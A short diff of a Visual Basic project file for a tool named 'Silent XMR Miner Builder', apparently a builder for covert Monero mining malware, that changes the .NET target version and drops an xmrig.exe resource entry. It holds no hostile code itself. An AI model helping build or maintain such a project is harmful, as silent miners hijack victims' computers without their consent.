@@ -11,7 +11,7 @@
     <AssemblyName>Silent XMR Miner Builder</AssemblyName>
     <FileAlignment>512</FileAlignment>
     <MyType>WindowsForms</MyType>
-    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
     <IsWebBootstrapper>false</IsWebBootstrapper>
     <TargetFrameworkProfile>
     </TargetFrameworkProfile>
@@ -195,7 +195,6 @@
   </ItemGroup>
   <ItemGroup>
     <None Include="Resources\WinRing0x64.sys" />
-    <None Include="Resources\xmrig.exe" />
   </ItemGroup>
   <ItemGroup>
     <None Include="Resources\Project1.dll" />
